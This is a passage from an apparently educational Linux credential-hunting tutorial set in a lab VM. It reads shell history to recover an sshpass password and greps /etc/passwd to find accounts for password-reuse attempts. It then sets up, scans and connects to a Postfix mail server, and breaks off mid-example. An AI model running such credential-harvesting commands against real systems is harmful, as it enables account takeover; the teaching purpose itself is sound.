<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat ~/.history
</span></span><span class="line"><span class="cl"><span class="nb">history</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sshpass-scenario">sshpass Scenario</h3>
<p>Let&rsquo;s install <code>sshpass</code>  and the <code>ssh-client</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install sshpass ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Restart the ssh service and check its status:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo systemctl restart sshd.service <span class="o">&amp;&amp;</span> sudo systemctl status sshd.service 
</span></span><span class="line"><span class="cl">● ssh.service - OpenBSD Secure Shell server
</span></span><span class="line"><span class="cl">     Loaded: loaded <span class="o">(</span>/lib/systemd/system/ssh.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
</span></span><span class="line"><span class="cl">     Active: active <span class="o">(</span>running<span class="o">)</span> since Wed 2021-01-05 20:25:36 AST<span class="p">;</span> 11ms ago
</span></span><span class="line"><span class="cl">       Docs: man:sshd<span class="o">(</span>8<span class="o">)</span>
</span></span><span class="line"><span class="cl">             man:sshd_config<span class="o">(</span>5<span class="o">)</span>
</span></span><span class="line"><span class="cl">    Process: <span class="m">26904</span> <span class="nv">ExecStartPre</span><span class="o">=</span>/usr/sbin/sshd -t <span class="o">(</span><span class="nv">code</span><span class="o">=</span>exited, <span class="nv">status</span><span class="o">=</span>0/SUCCESS<span class="o">)</span>
</span></span><span class="line"><span class="cl">   Main PID: <span class="m">26905</span> <span class="o">(</span>sshd<span class="o">)</span>
</span></span><span class="line"><span class="cl">      Tasks: <span class="m">1</span> <span class="o">(</span>limit: 4599<span class="o">)</span>
</span></span><span class="line"><span class="cl">     Memory: 1.0M
</span></span><span class="line"><span class="cl">     CGroup: /system.slice/ssh.service
</span></span><span class="line"><span class="cl">             └─26905 sshd: /usr/sbin/sshd -D <span class="o">[</span>listener<span class="o">]</span> <span class="m">0</span> of 10-100 startups
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s authenticate to localhost using sshpass so we can avoid an interactive logon:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sshpass -p pass321 ssh -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user@localhost
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.11.0-43-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">13</span> updates can be applied immediately.
</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your Hardware Enablement Stack <span class="o">(</span>HWE<span class="o">)</span> is supported <span class="k">until</span> April 2025.
</span></span><span class="line"><span class="cl">*** System restart required ***
</span></span><span class="line"><span class="cl">Last login: Tue Dec <span class="m">20</span> 21:27:18 <span class="m">2021</span> from 10.10.10.15
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s exit out of the SSH shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="nb">logout</span>
</span></span><span class="line"><span class="cl">Connection to localhost closed.
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span><span class="line"><span class="cl">****
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now from the adversary&rsquo;s perspective, we can attempt to read the history of the shell:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat ~/.bash_history<span class="p">;</span> <span class="nb">echo</span> <span class="s2">&#34;history command output:&#34;</span><span class="p">;</span> <span class="nb">history</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s filter this output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat ~/.bash_history <span class="p">|</span> grep sshpass
</span></span><span class="line"><span class="cl">sudo apt install sshpass
</span></span><span class="line"><span class="cl">sshpass -p pass321 ssh user@localhost
</span></span><span class="line"><span class="cl">sudo apt install sshpass ssh
</span></span><span class="line"><span class="cl">sshpass
</span></span><span class="line"><span class="cl">sshpass -p pass321 ssh user@localhost -p <span class="m">22</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@pwn:~$ <span class="nb">history</span> <span class="p">|</span> grep sshpass
</span></span><span class="line"><span class="cl">  <span class="m">643</span>  sudo apt install sshpass
</span></span><span class="line"><span class="cl">  <span class="m">644</span>  sshpass -p pass321 ssh user@localhost
</span></span><span class="line"><span class="cl">  <span class="m">646</span>  sudo apt install sshpass ssh
</span></span><span class="line"><span class="cl">  <span class="m">648</span>  sshpass
</span></span><span class="line"><span class="cl">  <span class="m">652</span>  sshpass -p pass321 ssh user@localhost -p <span class="m">22</span>
</span></span><span class="line"><span class="cl">  <span class="m">655</span>  sshpass -p exitu2tryhack ssh -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user@localhost
</span></span><span class="line"><span class="cl">  <span class="m">656</span>  sshpass -p pass321 ssh -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no user@localhost
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see from the output above, we have found a potential password which is <code>pass321</code>. As an adversary, we could try to use this password with all the users that have <code>bash</code>/<code>zsh</code>/<code>sh</code> shell defined on the system. This can be found in the <code>/etc/passwd</code> file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/passwd <span class="p">|</span> grep <span class="s2">&#34;sh</span>$<span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">user:x:1000:1000:user,,,:/home/user:/bin/bash
</span></span><span class="line"><span class="cl">user:x:1001:1001:,,,:/home/user:/bin/bash
</span></span><span class="line"><span class="cl">test:x:1002:1002::/home/test:/bin/sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>We could try to log in either with SSH, Telnet, FTP, NFS, or any other service or locally try the password we found which is <code>pass321</code> on all these users. This technique is also known as password reuse. As system administrators, we shall never use the same password for other users or services.</p>
<p>Here we can read a Red Hat Documentation on how we can use <a href="https://www.redhat.com/sysadmin/ssh-automation-sshpass" target="_blank" rel="noopener noreffer ">sshpass</a></p>
<h2 id="emails">Emails</h2>
<p>Sending credentials via email is a very common mistake that I have seen in the real world. Let&rsquo;s try to find credentials in the emails of the system.</p>
<h3 id="smtp-postfix-scenario">SMTP Postfix Scenario</h3>
<p>Let&rsquo;s startup by setting up an SMTP server.</p>
<p>Set a valid <strong>FQDN</strong> (<strong>Fully Qualified Domain Name</strong>) hostname for our Ubuntu system using the <a href="https://www.tecmint.com/hostname-command-examples-for-linux/" target="_blank" rel="noopener noreffer ">hostnamectl command</a> as shown here:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo hostnamectl set-hostname mail.user.com
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now the hostname has changed:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ hostname
</span></span><span class="line"><span class="cl">mail.user.com
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Postfix</strong> is a mail transfer agent (<strong>MTA</strong>) which is the responsible software for delivering &amp; receiving emails, it’s essential to create a complete mail server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install postfix
</span></span></code></pre></td></tr></table>
</div>
</div><p>I&rsquo;m going to set up an <code>Internet Site</code> although my VM is not on the Internet but rather in a virtualized LAN network. Once Postfix is installed, it will automatically start and creates a new <strong>/etc/postfix/main.cf</strong> file. we can verify the Postfix version and status of the service using the following commands.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ postconf mail_version
</span></span><span class="line"><span class="cl"><span class="nv">mail_version</span> <span class="o">=</span> 3.4.13
</span></span><span class="line"><span class="cl">user@pwn:~$ sudo systemctl status postfix
</span></span><span class="line"><span class="cl">● postfix.service - Postfix Mail Transport Agent
</span></span><span class="line"><span class="cl">     Loaded: loaded <span class="o">(</span>/lib/systemd/system/postfix.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
</span></span><span class="line"><span class="cl">     Active: active <span class="o">(</span>exited<span class="o">)</span> since Thu 2021-01-06 19:47:03 AST<span class="p">;</span> 1min 10s ago
</span></span><span class="line"><span class="cl">   Main PID: <span class="m">6685</span> <span class="o">(</span><span class="nv">code</span><span class="o">=</span>exited, <span class="nv">status</span><span class="o">=</span>0/SUCCESS<span class="o">)</span>
</span></span><span class="line"><span class="cl">      Tasks: <span class="m">0</span> <span class="o">(</span>limit: 4599<span class="o">)</span>
</span></span><span class="line"><span class="cl">     Memory: 0B
</span></span><span class="line"><span class="cl">     CGroup: /system.slice/postfix.service
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Jan <span class="m">06</span> 19:47:03 mail.user.com systemd<span class="o">[</span>1<span class="o">]</span>: Starting Postfix Mail Transport Agent...
</span></span><span class="line"><span class="cl">Jan <span class="m">06</span> 19:47:03 mail.user.com systemd<span class="o">[</span>1<span class="o">]</span>: Finished Postfix Mail Transport Agent.
</span></span></code></pre></td></tr></table>
</div>
</div><p>The mail configuration file looks like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo cat  /etc/postfix/main.cf
</span></span><span class="line"><span class="cl"><span class="c1"># See /usr/share/postfix/main.cf.dist for a commented, more complete version</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Debian specific:  Specifying a file name will cause the first</span>
</span></span><span class="line"><span class="cl"><span class="c1"># line of that file to be used as the name.  The Debian default</span>
</span></span><span class="line"><span class="cl"><span class="c1"># is /etc/mailname.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#myorigin = /etc/mailname</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">smtpd_banner</span> <span class="o">=</span> <span class="nv">$myhostname</span> ESMTP <span class="nv">$mail_name</span> <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">biff</span> <span class="o">=</span> no
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># appending .domain is the MUA&#39;s job.</span>
</span></span><span class="line"><span class="cl"><span class="nv">append_dot_mydomain</span> <span class="o">=</span> no
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Uncomment the next line to generate &#34;delayed mail&#34; warnings</span>
</span></span><span class="line"><span class="cl"><span class="c1">#delay_warning_time = 4h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">readme_directory</span> <span class="o">=</span> no
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on</span>
</span></span><span class="line"><span class="cl"><span class="c1"># fresh installs.</span>
</span></span><span class="line"><span class="cl"><span class="nv">compatibility_level</span> <span class="o">=</span> <span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># TLS parameters</span>
</span></span><span class="line"><span class="cl"><span class="nv">smtpd_tls_cert_file</span><span class="o">=</span>/etc/ssl/certs/ssl-cert-snakeoil.pem
</span></span><span class="line"><span class="cl"><span class="nv">smtpd_tls_key_file</span><span class="o">=</span>/etc/ssl/private/ssl-cert-snakeoil.key
</span></span><span class="line"><span class="cl"><span class="nv">smtpd_tls_security_level</span><span class="o">=</span>may
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">smtp_tls_CApath</span><span class="o">=</span>/etc/ssl/certs
</span></span><span class="line"><span class="cl"><span class="nv">smtp_tls_security_level</span><span class="o">=</span>may
</span></span><span class="line"><span class="cl"><span class="nv">smtp_tls_session_cache_database</span> <span class="o">=</span> btree:<span class="si">${</span><span class="nv">data_directory</span><span class="si">}</span>/smtp_scache
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">smtpd_relay_restrictions</span> <span class="o">=</span> permit_mynetworks permit_sasl_authenticated defer_unauth_destination
</span></span><span class="line"><span class="cl"><span class="nv">myhostname</span> <span class="o">=</span> mail.user.com
</span></span><span class="line"><span class="cl"><span class="nv">alias_maps</span> <span class="o">=</span> hash:/etc/aliases
</span></span><span class="line"><span class="cl"><span class="nv">alias_database</span> <span class="o">=</span> hash:/etc/aliases
</span></span><span class="line"><span class="cl"><span class="nv">myorigin</span> <span class="o">=</span> /etc/mailname
</span></span><span class="line"><span class="cl"><span class="nv">mydestination</span> <span class="o">=</span> <span class="nv">$myhostname</span>, mail.user.com, localhost.user.com, localhost
</span></span><span class="line"><span class="cl"><span class="nv">relayhost</span> <span class="o">=</span> 
</span></span><span class="line"><span class="cl"><span class="nv">mynetworks</span> <span class="o">=</span> 127.0.0.0/8 <span class="o">[</span>::ffff:127.0.0.0<span class="o">]</span>/104 <span class="o">[</span>::1<span class="o">]</span>/128
</span></span><span class="line"><span class="cl"><span class="nv">mailbox_size_limit</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">recipient_delimiter</span> <span class="o">=</span> +
</span></span><span class="line"><span class="cl"><span class="nv">inet_interfaces</span> <span class="o">=</span> loopback-only
</span></span><span class="line"><span class="cl"><span class="nv">default_transport</span> <span class="o">=</span> error
</span></span><span class="line"><span class="cl"><span class="nv">relay_transport</span> <span class="o">=</span> error
</span></span><span class="line"><span class="cl"><span class="nv">inet_protocols</span> <span class="o">=</span> all
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>inet_interfaces</code> variable declares the interfaces in which the service will listen:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">inet_interfaces</span> <span class="o">=</span> loopback-only
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see this is only listening on the loopback interface in IPv4 and IPv6 but we need to send emails from another host/machines/nodes so we need this service to be listening on the ethernet interface. This is what happens if we select <code>loopback only</code> option during the installation configuration. We can change this by adding our interfaces&rsquo; IP addresses:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ip --color<span class="o">=</span>auto --brief addr
</span></span><span class="line"><span class="cl">lo               UNKNOWN        127.0.0.1/8 ::1/128 
</span></span><span class="line"><span class="cl">ens33            UP             10.10.10.14/24 fe80::8450:b1b6:be0a:a735/64 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s modify the <code>inet_interfaces</code> variable and add the IP address of our ethernet interface:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">inet_interfaces</span> <span class="o">=</span> 10.10.10.14, 127.0.0.1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Restart the postfix service to apply the changes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo systemctl restart postfix
</span></span><span class="line"><span class="cl">user@pwn:~$ sudo systemctl status postfix
</span></span><span class="line"><span class="cl">● postfix.service - Postfix Mail Transport Agent
</span></span><span class="line"><span class="cl">     Loaded: loaded <span class="o">(</span>/lib/systemd/system/postfix.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
</span></span><span class="line"><span class="cl">     Active: active <span class="o">(</span>exited<span class="o">)</span> since Thu 2021-01-06 20:09:30 AST<span class="p">;</span> 3s ago
</span></span><span class="line"><span class="cl">    Process: <span class="m">10037</span> <span class="nv">ExecStart</span><span class="o">=</span>/bin/true <span class="o">(</span><span class="nv">code</span><span class="o">=</span>exited, <span class="nv">status</span><span class="o">=</span>0/SUCCESS<span class="o">)</span>
</span></span><span class="line"><span class="cl">   Main PID: <span class="m">10037</span> <span class="o">(</span><span class="nv">code</span><span class="o">=</span>exited, <span class="nv">status</span><span class="o">=</span>0/SUCCESS<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Jan <span class="m">06</span> 20:09:30 mail.user.com systemd<span class="o">[</span>1<span class="o">]</span>: Starting Postfix Mail Transport Agent...
</span></span><span class="line"><span class="cl">Jan <span class="m">06</span> 20:09:30 mail.user.com systemd<span class="o">[</span>1<span class="o">]</span>: Finished Postfix Mail Transport Agent.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check if the service is listening on the ethernet interface:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ss -tnlp <span class="p">|</span> grep <span class="m">25</span>
</span></span><span class="line"><span class="cl">LISTEN  <span class="m">0</span>       <span class="m">100</span>              127.0.0.1:25            0.0.0.0:*              
</span></span><span class="line"><span class="cl">LISTEN  <span class="m">0</span>       <span class="m">100</span>        10.10.10.14:25            0.0.0.0:*   
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can enumerate this service using <code>Nmap</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ sudo nmap -p <span class="m">25</span> --min-rate <span class="m">5000</span> -sCV 10.10.10.14
</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-06 19:11 EST
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.14
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">25/tcp open  smtp    Postfix smtpd
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_smtp-commands: mail.user.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ubuntu
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:ubuntu
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-12-20T23:54:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-12-18T23:54:25
</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:35:5B:CD <span class="o">(</span>VMware<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: Host:  mail.user.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.47 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s try to send an email from any other machine that&rsquo;s on our virtualized LAN network. We can use tools like telnet, nc, or swaks to send emails via the terminal:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -nv 10.10.10.14 <span class="m">25</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.14<span class="o">]</span> <span class="m">25</span> <span class="o">(</span>smtp<span class="o">)</span> open
</span></span><span class="line"><span class="cl"><span class="m">220</span> mail.user.com ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">HELO x
</span></span><span class="line"><span class="cl"><span class="m">250</span> mail.user.com
</span></span><span class="line"><span class="cl">QUIT
</span></span><span class="line"><span class="cl"><span class="m">221</span> 2.0.0 Bye
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ telnet 10.10.10.14 <span class="m">25</span>
</span></span><span class="line"><span class="cl">Trying 10.10.10.14...
</span></span><span class="line"><span class="cl">Connected to 10.10.10.14.
</span></span><span class="line"><span class="cl">Escape character is <span class="s1">&#39;^]&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="m">220</span> mail.user.com ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">HELO x
</span></span><span class="line"><span class="cl"><span class="m">250</span> mail.user.com
</span></span><span class="line"><span class="cl">QUIT
</span></span><span class="line"><span class="cl"><span class="m">221</span> 2.0.0 Bye
</span></span><span class="line"><span class="cl">Connection closed by foreign host.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alright, let&rsquo;s send an email:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
